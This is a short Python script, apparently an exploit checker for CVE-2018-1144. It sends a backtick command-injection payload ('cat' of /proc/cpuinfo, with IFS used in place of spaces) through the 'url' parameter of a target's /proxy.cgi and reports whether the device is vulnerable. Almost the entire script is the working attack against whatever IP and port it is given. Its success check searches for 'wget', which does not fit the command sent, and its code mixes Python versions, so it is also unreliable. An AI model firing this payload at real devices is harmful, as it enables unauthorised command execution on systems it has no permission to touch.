import sys
import re
import requests
from colorama import Fore

description= r"""
 -----------------------------------------------------------------------------
|                                                                            |
|                                                                            |
|                                                                            |
|                                 Hyo-In                                     |
|                                                                            |
|                                                                            |
|                                                                            |
 -----------------------------------------------------------------------------
"""
def packet(target, port):
	try:
		s = requests.Session()
		URL = 'http://'+target+':'+port+'/proxy.cgi'
		params={'url' : '`cat$\\{IFS%?\\}/proc/cpuinfo`'}
		req = s.get(URL, params=params)
	
		if req.status_code == 200 and re.search('wget', req.text):
			print (Fore.GREEN+" [+] Vulnarable to CVE-2018-1144"+Fore.RESET)
		else:
			print (Fore.YELLOW+" [-] Not Vulnarable to CVE-2018-1144"+Fore.RESET)

	except:
		print(Fore.YELLOW+" [-] Not Vulnarable to CVE-2018-1144"+Fore.RESET)
		pass


# MAIN
if __name__ == "__main__":
	print description
	if len(sys.argv) is not 3:
		print(Fore.YELLOW+" [-] Example: python CVE-2018-1144.py <Target IP> <port>"+Fore.RESET)
		sys.exit(1)
	else:
		packet(sys.argv[1], sys.argv[2])
